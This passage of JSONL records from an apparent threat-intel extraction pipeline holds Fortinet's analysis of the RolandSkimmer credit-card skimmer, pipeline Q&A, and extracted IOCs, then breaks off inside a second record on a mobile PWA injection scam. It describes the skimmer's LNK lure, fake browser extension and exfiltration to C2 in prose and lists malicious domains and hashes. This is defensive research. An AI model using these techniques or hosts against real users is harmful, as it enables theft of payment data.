&lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "It is a credit card skimming malware, specifically a web-based credit card skimmer known as \"RolandSkimmer\".", "question": "What kind of malware is it?"}, {"answer": "It involves a web-based credit card skimming attack, specifically a sophisticated campaign dubbed \"RolandSkimmer\" that targets users through malicious browser extensions.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to steal sensitive user data, including credit card information, by injecting malicious scripts into web pages.", "question": "Does the malware using web inject?"}, {"answer": "Yes, the malware is designed to steal form data, login credentials, and credit card information from the browser.", "question": "Is there credential theft from the browser?"}, {"answer": "Yes, the malware installs malicious browser extensions, including for Chrome, by downloading files from \"fzhivka-001-site1.btempurl.com\" which include extension configurations and malicious scripts for Chrome.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The RolandSkimmer threat steals sensitive financial data, including credit card information.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The RolandSkimmer is related to credit card skimming, which involves stealing sensitive financial data, including credit card information, but it is not specifically referred to as a wallet stealer in the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The malware, known as RolandSkimmer, steals sensitive financial data, including credit card information, such as credit card numbers. It also monitors user interactions, including form submissions, browsing activity, and login credentials.", "question": "What kind of information the malware steals?"}, {"answer": "The stolen information is sent to the attacker's command-and-control (C2) server via an HTTPS request with specific parameters in the URL.", "question": "Where does it forward the stolen information?"}, {"answer": "The threat actor targets users in Bulgaria, but specific bank names, regions, or wallets are not mentioned in the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://www.fortinet.com/blog/threat-research/rolandskimmer-silent-credit-card-thief-uncovered", "error": null, "summary": "The main threat discussed is the \"RolandSkimmer\" malware, a sophisticated credit card skimming campaign that targets users in Bulgaria. The attackers use a combination of techniques, including malicious browser extensions, obfuscated scripts, and deceptive LNK files, to establish persistent and covert access to the victim's system. The targets of this campaign are Microsoft Windows users, particularly those using Chrome, Edge, and Firefox browsers. The potential impact of this malware is high, as it can collect sensitive financial data, including credit card information, and exfiltrate it to the attacker's server, resulting in financial loss and identity theft for the victims.", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "invsetmx[.]com"}, {"type": "Domain or URL", "value": "fzhivka-001-site1[.]btempurl[.]com"}, {"type": "Domain or URL", "value": "exmkleo[.]com"}, {"type": "Domain or URL", "value": "bg3dsec[.]com"}, {"type": "Domain or URL", "value": "zzigi20-001-site1.atempurl.com"}, {"type": "Domain or URL", "value": "topclima-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "rinootracebg-001-site1.etempurl.com"}, {"type": "Domain or URL", "value": "mgproperties-001-site1.itempurl.com"}, {"type": "Domain or URL", "value": "kleoti-001-site1.htempurl.com"}, {"type": "Domain or URL", "value": "hxxp://invsetmx[.]com/n.jpg"}, {"type": "Domain or URL", "value": "hxxps://exmkleo[.]com"}, {"type": "SHA256 Hash", "value": "80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515"}, {"type": "SHA256 Hash", "value": "e30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908"}, {"type": "SHA256 Hash", "value": "e0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d"}], "mitre_ttps": null, "keywords_found": ["browser", "analysis", "apt", "malicious", "threat", "bank", "botnet", "intelligence", "phishing", "banking trojan"], "article_textual_content": "# RolandSkimmer: Silent Credit Card Thief Uncovered\n\n- Article Contents\n\nAffected Platforms: Microsoft Windows\n\nImpacted Users: Microsoft Windows\n\nImpact: Collects victim’s sensitive information\n\nSeverity Level: High\n\nWeb-based credit card skimming remains a widespread and persistent threat, known for its ability to adapt and evolve over time. FortiGuard Labs recently observed a sophisticated campaign dubbed “RolandSkimmer,” named after the unique string “Rol@and4You” found embedded in its payload. This threat actor targets users in Bulgaria and represents a new wave of credit card skimming attacks leveraging malicious browser extensions across Chrome, Edge, and Firefox.\n\n2025 Global Threat Landscape Report\n\nUse this report to understand the latest attacker tactics, assess your exposure, and prioritize action before the next exploit hits your environment.\n\nThe attack is initiated via a deceptive LNK file, which deploys obfuscated scripts to establish persistent and covert access. Once embedded, the malware systematically harvests and exfiltrates sensitive financial data from affected users—often without detection.\n\n## Initial Infection Vector\n\nThe attacker first spreads a malicious ZIP file named “faktura\\_3716804.zip.” Upon extraction, users are confronted with a seemingly harmless shortcut file named “faktura\\_1065170.lnk.”\n\nThis shortcut covertly executes the following hidden command:\n\nThe page “ipa.AsPX” then redirects to the URL “hxxp://invsetmx[.]com/n.jpg.” Despite its “.jpg” extension, this file actually contains an obfuscated VBScript payload. This script initiates a continuous connection loop, polling the attacker’s server for commands marked by a specific delimiter, “-@-”. Once instructions are received, the script decodes the provided hexadecimal data and executes the corresponding malicious commands.\n\nBelow is a network traffic example showing both the regular communication and the encoded commands received from the server.\n\n## Attack Workflow\n\nThe encoded VBScript, delivered through the HTTP response, is executed directly by the original process without writing any files to disk. We obtained the attacker’s scripts from the server invsetmx[.]com, where all payloads are saved with a .dll extension. The following analysis details the activities carried out by the decoded scripts.\n\nFirst, it checks the victim’s environment to see if there are Adobe, Firefox, Roaming, and Chrome folders in a specific path.\n\nIt then performs extensive system reconnaissance by querying hardware details, including CPU specifications, memory size, and operating system information. This collected intelligence helps guide targeted actions and provides attackers with valuable insight into the infected host, preventing them from wasting resources on virtual machines or sandbox environments.\n\nTo target browser extensions, the threat actor downloads additional files from “fzhivka-001-site1.btempurl.com,” which include extension configurations and malicious scripts. The files are categorized by browser: 2ch1.rar to 2ch3.rar for Chrome and 2eg1.rar to 2eg3.rar for Edge. All of these files are XOR-encoded and require decoding using the key “andromeda.”\n\nThe following steps illustrate the procedure for targeting the Microsoft Edge browser. It saves the decoded contents to the directory %APPDATA%\\..\\Local\\s2ch97, which contains key components of the malicious extension: “manifest.json,” “background.js,” and “background2.js.” These files are responsible for configuring the extension and executing its background activities.\n\nThe attacker leverages a malicious Edge browser extension as a critical component in its infection chain, persistence mechanism, and data exfiltration process. Disguised under the seemingly benign name “Disable Content Security Policy,” the extension claims to bypass website CSP protections. This deceptive naming strategy helps obscure its malicious intent while ensuring compatibility with targeted websites.\n\nThe extension’s manifest.json file explicitly requests a broad and highly invasive set of permissions:\n\n- declarativeNetRequest – Allows the extension to intercept and modify network requests made by the browser.\n- browsingData – Grants the ability to manipulate or erase browsing data, including cookies, cache, and history.\n- tabs – Enables control over browser tabs, allowing it to open, close, and monitor the content of any tab the user accesses.\n- storage – Permits the extension to store and retrieve data locally on the user’s device.\n\nThis combination of permissions reveals a deliberately engineered design to dominate the user’s browser—transforming a tool built for convenience into a weapon for surveillance, theft, and deception.\n\nThe background.js file is injected as a content script into every webpage the victim visits. Its functions include tracking the victim using a unique identifier and executing malicious code.\n\nTo generate the identifier, a value called key2 is created based on the current timestamp, including the date, hours, minutes, seconds, and milliseconds. An example format is 21.3.25-164532eg2. This identifier is stored persistently in the browser’s local storage, enabling the attacker to track the same user across sessions.\n\nThe script then retrieves an encrypted payload from a local storage key named kuka. To execute this payload, it injects a deliberately malformed HTML tag—&lt;imaage&gt; instead of a valid &lt;img&gt; or &lt;image&gt; tag. This intentional misspelling causes a loading error, triggering the onerror event handler, which immediately evaluates and executes arbitrary JavaScript defined in background2.js.\n\nThe background2.js script is a persistent service worker for the malicious browser extension. It dynamically constructs remote URLs using heavily obfuscated JavaScript functions named yori1 and yori2. These functions retrieve new scripts from a remote malicious server, “hxxps://exmkleo[.]com,” enabling continuous updates to the malicious payloads.\n\n\n\nThe retrieved payloads—also obfuscated JavaScript snippets—are stored within the browser's local storage under the key “kuka.”\n\nThe malicious scripts downloaded from “hxxps://exmkleo[.]com” are designed to monitor user interactions—specifically focusing on form submissions, browsing activity, and credit card data. The skimmer monitors DOM elements for input fields containing sensitive payment information, such as credit card numbers. It explicitly targets standard credit card numbering conventions, such as Visa (starting with a 4) and MasterCard (beginning with a 5).\n\nAfter detecting potential credit card data, the script actively binds to form submission and button-click events, intercepting user input just before submission. For data exfiltration, it leverages hidden &lt;a&gt; elements and appends a unique marker string—Rol@and4You—to help track or validate stolen data. The use of randomized URL paths combined with hidden elements significantly reduces detection risk, increasing the likelihood of successful data theft.\n\nOnce the data is captured, the script sends an HTTPS request to its command-and-control (C2) server with specific parameters in the URL (S:Site, D:Data, and N:Credit Card Number):\n\nAttackers then achieve persistence by performing the following sophisticated operations. Notably, they do not directly tamper with or modify the legitimate Edge browser binaries. Instead, they copy the legitimate Microsoft Edge executable (msedge.exe) into a concealed folder (%APPDATA%\\Edge SxS).\n\nThe critical component of this attack lies in the maliciously crafted LNK file with the following arguments:\n\nThe LNK file triggers the loading of the malicious browser extension and script configuration in the “s2ch97” folder. To complete the deception, the attackers remove legitimate Edge shortcuts from both the Desktop and Taskbar, replacing them with these modified, malicious shortcuts—ensuring the victim unknowingly launches the infected browser environment.\n\nThe attacker uses a different attack method for Mozilla Firefox, leveraging downloaded files named “as1.rar” through “as6.rar.”\n\nThese decoded RAR files represent a complete package of malicious Firefox extension components and supporting scripts. Each serves a distinct role in emulating a legitimate extension environment and forcing its installation.\n\n- as1.rar: The JSON file describes two Mozilla Firefox browser extensions: Greasemonkey and Tampermonkey. These extensions allow users to customize how web pages look or behave by running small JavaScript scripts.\n\n- as2.rar: A compressed file used by Mozilla Firefox to store metadata about installed extensions in a user’s profile\n\n- as3.rar: This JSON file includes both built-in and user-installed extensions, along with details such as version, type, permissions, and file paths. Firefox uses this file during startup to load and manage its extensions.\n\n- as4.rar: Includes setting Firefox preferences.\n\n- as5.rar: The actual tampermonkey.xpi file (version 4.7.5788).\n- as6.rar: This archive contains a malicious script specifically designed to be auto-imported by Tampermonkey, a popular userscript manager. Once installed, the script enables the theft of form data, login credentials, and credit card information. The decoded server identifier “kok1” corresponds to hxxps://exmkleo[.]com, from which the attackers download a script similar to the one used in the Edge attack procedure.\n\nBy leveraging these files together, the attacker can simulate a fully valid Firefox user profile with a preinstalled and functioning Tampermonkey extension. By copying these files into the victim’s environment, the malware ensures Firefox boots with the attacker's malicious extension already enabled.\n\nOnce all the browsers’ related settings are complete, mshta.exe is killed.\n\nUpon examining the remote server where the original LNK file was hosted, we discovered several victim log files. These files were hex-encoded, and the full infection process within the victim’s environment was documented.\n\nThese logs included status messages such as:\n\n- “mz out, roaming in, ch in” – indicating the environment check found no Firefox installation but detected a Roaming folder and Chrome browser.\n- “eg found...desk lnk ok” – confirming that Edge was present and the malicious LNK file had been successfully placed on the Desktop.\n\nThese logs suggest the malware performs adaptive behavior based on the target’s environment, customizing its infection path accordingly.\n\n## Conclusion\n\n“RolandSkimmer” underscores the growing sophistication of LNK-based threats, demonstrating how attackers can exploit legitimate system tools and scripting capabilities to achieve stealth, persistence, and data exfiltration. This campaign notably relies on a malicious browser extension as a core component of its infection chain, enabling long-term access and the continuous theft of sensitive user data, including credit card information.\n\nThe attackers employ carefully crafted JavaScript payloads, misleading manifest files, and obfuscated VBScripts to maintain persistence across sessions and evade detection. To reduce the risk of such infections, users should avoid opening unknown LNK files, especially those delivered via email or from untrusted sources. Organizations should also restrict or monitor the use of unverified browser extensions and implement security tools capable of detecting unusual script activity.\n\n### Fortinet Protections\n\nThe malware described in this report are detected and blocked by FortiGuard Antivirus as:\n\nLNK/Agent.96F1!tr\n\nJS/Agent.SOM!tr\n\nVBS/Agent.ABUE!tr\n\nFortiGate, FortiMail, FortiClient, and FortiEDR support the FortiGuard Antivirus Service. The FortiGuard antivirus engine is part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected.\n\nThe FortiGuard CDR (content disarm and reconstruction) service can disarm the malicious macros within the document.\n\nWe also suggest that organizations take the free Fortinet Fortinet Certified Fundamentals (FCF) cybersecurity training. The training is designed to help users learn about today's threat landscape and introduces basic cybersecurity concepts and technology.\n\nFortiGuard IP Reputation and Anti-Botnet Security Service proactively block malware attacks by aggregating malicious source IP data from the Fortinet distributed network of threat sensors, CERTs, MITRE, cooperative competitors, and other global sources that collaborate to provide up-to-date threat intelligence about hostile sources.\n\nIf you believe this or any other cybersecurity threat has impacted your organization, please contact the Global FortiGuard Incident Response Team.\n\n## IOCs\n\n#### C2\n\ninvsetmx[.]com\n\nfzhivka-001-site1[.]btempurl[.]com\n\nexmkleo[.]com\n\nbg3dsec[.]com\n\nzzigi20-001-site1.atempurl.com\n\ntopclima-001-site1.itempurl.com\n\nrinootracebg-001-site1.etempurl.com\n\nmgproperties-001-site1.itempurl.com\n\nkleoti-001-site1.htempurl.com\n\n#### SHA256\n\n ZIP\n\n80e0aa05ffd973decf9b7f435c5a44574e4c8314c152c7a09e00c821828fe515\n\ne30eecb53e4b03cfada8791877c3c67e009d25bb4d57f01f9eb7cd1121ac1908\n\ne0898e5d1f71bb0311ddfdef9697f684da6da701ad36ab8107dcb5d5e438838d\n\n#### LNK\n\n86fedcd08d32eeff8a4caa9c2d4ae65b6cea89698570e8ce172a4e82c7f296f1\n\n7086f0ec83dab46aaaecbc459275d7df4e32f50d950047a9235dfccb3da9b9e0\n\n#### SCRIPT\n\n4a852420ca4a32d9ade0a50b8e24d6fc4886151c44477a62ee961ce880b1f8d2\n\ncd6180a612852167a2a1b6c456618a3716d040c163a63e50c17236660e4e7e53\n\nc02d73011204637141fdcc4240b65896b7624508eb116543acfbe3bf7fa29eb4\n\n5810cbdd316eb37ad49ab277604209deb73306c5254eac39164ae626e5aadf6c\n\nCara Lin\n\n### Related Posts\n\nFortiGuard Labs Threat Research\n\n##### Coyote Banking Trojan: A Stealthy Attack via LNK Files\n\nFortiGuard Labs Threat Research\n\n##### Horabot Unleashed: A Stealthy Phishing Threat\n\nFortiGuard Labs Threat Research\n\n##### New Banking Trojan “CHAVECLOAK” Targets Brazil\n\n#### News &amp; Articles\n\n- News Releases\n- News Articles\n\n#### Security Research\n\n- Threat Research\n- FortiGuard Labs\n- Threat Map\n- Ransomware Prevention\n\n#### Connect With Us\n\n- Fortinet Community\n- Partner Portal\n- Investor Relations\n- Product Certifications\n\n#### Company\n\n- About Us\n- Exec Mgmt\n- Careers\n- Training\n- Events\n- Industry Awards\n- Social Responsibility\n- CyberGlossary\n- Sitemap\n- Blog Sitemap\n\n#### Contact Us\n\n- (866) 868-3678\n\nCopyright © 2025 Fortinet, Inc. All Rights Reserved\n\nAlso of Interest:\n\n- Progress against vulnerabilities\n- Network Security Vulnerabilities\n- Leader in Gartner Magic Quadrant for SD-WAN\n- FortiGuard Labs Threat Research"}}
{"metadata" : {"revision_id": "f656170-dirty", "ls_run_depth": 0, "dataset_split": ["base"], "LANGSMITH_PROJECT": "autoc", "LANGSMITH_TRACING": "true", "LANGSMITH_ENDPOINT": "https://api.smith.langchain.com"}, "inputs" : {"qna": [], "url": "https://cside.dev/blog/chinese-adult-content-scam-targets-mobile-users-through-pwa-injection", "error": null, "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [], "mitre_ttps": null, "keywords_found": [], "article_textual_content": null}, "outputs" : {"qna": [{"answer": "The answer cannot be determined from the provided context.", "question": "What kind of malware is it?"}, {"answer": "It involves a Progressive Web App (PWA) injection campaign, specifically a Chinese adult-content PWA scam that targets mobile users through third-party JavaScript injection.", "question": "What kind of attack does it involve?"}, {"answer": "Yes, the malware uses web inject to redirect mobile users to a Chinese adult-content PWA scam.", "question": "Does the malware using web inject?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is there credential theft from the browser?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does the malware install malicious chrome extension?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Does is steals credit cards or bank information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Is it related to wallet stealer?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What kind of information the malware steals?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "Where does it forward the stolen information?"}, {"answer": "The answer cannot be determined from the provided context.", "question": "What are the targeted located (regions, banks name, wallets)?"}], "url": "https://cside.dev/blog/chinese-adult-content-scam-targets-mobile-users-through-pwa-injection", "error": "unexpected '{' in field name", "summary": "", "settings": {"keywords": [], "analyst_questions": [], "skip_ioc_extraction": false}, "iocs_found": [{"type": "Domain or URL", "value": "hxxps://xjdm166[.]com/html/#/i/home"}, {"type": "Domain or URL", "value": "xxsmad6[.]com"}, {"type": "Domain or URL", "value": "xjdm166[.]com"}, {"type": "Domain or URL", "value": "toutiaoimg[.]com"}, {"type": "Domain or URL", "value": "https://www.akav50.top/list/yn2k0ypd"}, {"type": "Domain or URL", "value": "https://www.akav50.top/list/r42r7opq"}, {"type": "Domain or URL", "value": "https://www.akav50.top/list/mqp10w2x"}, {"type": "Domain or URL", "value": "https://www.akav50.top/list/z32x7npd"}, {"type": "Domain or URL", "value": "https://www.akav50.top/list/1dpy76pv"}, {"type": "Domain or URL", "value": "https://www.akav50.top/list/oq5dd058"}, {"type": "Domain or URL", "value": "https://www.akav50.top/list/q5o9gx5w"}, {"type": "Domain or URL", "value": "https://www.akav50.top/list/l50dx72e"}, {"type": "Domain or URL", "value": "https://www.akav50.top/list/32xdq1pd"}, {"type": "Domain or URL", "value": "https://www.akav50.top/list/92qlr9pn"}, {"type": "Domain or URL", "value": "hxxps://xxsmad6[.]com/s.php?g=1&t=2&p=1388&i="}, {"type": "Domain or URL", "value": "hxxps://xjdm166[.]com/html/?p=1388"}, {"type": "Domain or URL", "value": "hxxps://xxsmad6[.]com/static/union/images/b-5.png"}, {"type": "Domain or URL", "value": "hxxps://p3-sign.toutiaoimg[.]com"}, {"type": "Domain or URL", "value": "hxxps://xxsmad6[.]com/static/union/images/close.png"}], "mitre_ttps": null, "keywords_found": ["analysis", "fraud", "malicious", "phishing", "browser"], "article_textual_content": "# Stop Fraudulent Job Applications Before They Enter Your Funnel\n\n- Industries\n- Compare\n- Pricing\n- Blog\n- Partners\n- About\n\nBook a demo\n\nLogin\n\nGet started\n\nBack to blog\n\n# Chinese Adult Content Scam Targets Mobile Users Through PWA Injection\n\n### Tuesday, May 20th, 2025\n\nH\n\n### Himanshu Anand\n\nWe’ve identified a fresh injection campaign abusing third-party JavaScript to redirect mobile users to a Chinese adult-content PWA scam.\n\nExample (NSFW): hxxps://xjdm166[.]com/html/#/i/home\n\nWhile the payload itself is nothing new (yet another adult gambling scam), the delivery method stands out. The malicious landing page is a full-blown Progressive Web App (PWA), likely aiming to retain users longer and bypass basic browser protections.\n\nPWAs are often ignored within the client-side security space. Yet, any browser-based delivery is susceptible to these kinds of vulnerabilities.\n\n## What’s happening:\n\n1. Mobile-Only Targeting: The script filters out desktop users, focusing attacks on mobile devices.\n2. Viewport Injection: If the compromised page lacks a viewport meta tag, it injects one to ensure proper mobile rendering.\n3. Ad Overlay Injection :\n    - A dark semi-transparent overlay is added.\n    - An image is fetched from toutiaoimg[.]com to act as the main visual.\n    - A close button image is added — but clicking it triggers a redirect.\n4. Click Hijacking :\n    - Clicking either the main image or the fake close button opens the PWA scam site in a new tab.\n    - Classic bait-and-switch.\n5. External Resources Loaded :\n    - xxsmad6[.]com (main loader and assets)\n    - xjdm166[.]com (final landing scam site)\n    - toutiaoimg[.]com (disguising as a legitimate image host)\n\n## PWAs attacks are on the rise\n\n- The use of PWAs suggests attackers are experimenting with more persistent phishing methods.\n- The mobile-only focus allows them to evade many detection mechanisms.\n- This is yet another variation of the Chinese adult gambling injection campaigns we’ve seen in recent months, but with a new delivery tactic.\n\n## Compromised websites: disguised as novel reading platforms\n\n```\n<title>海棠文学网_好看的小说_小说排行榜_最全的小说阅读网</title>  \n<title>神马小说网 - 最好看的免费小说阅读网</title>  \n<title>78小说网_书友最值得收藏!</title>  \n<title>寂寞书屋 - 纯净阅读,无弹窗广告干扰</title>\n```\n\nTranslated:\n\n```\n<title>Haitang Literature Network_Good novels_Novel rankings_The most comprehensive novel reading network</title>\n\n<title>Shenma Novel Network - The best free novel reading network</title>\n\n<title>78 Novel Network_Book friends are most worthy of collection!</title>\n\n<title>Lonely Book House - Pure reading, no pop-up ads</title>\n```\n\nIn the old TTP, the following websites were injected:\n\nold TTP\n\nIn the new TTP we found the code is encrypted 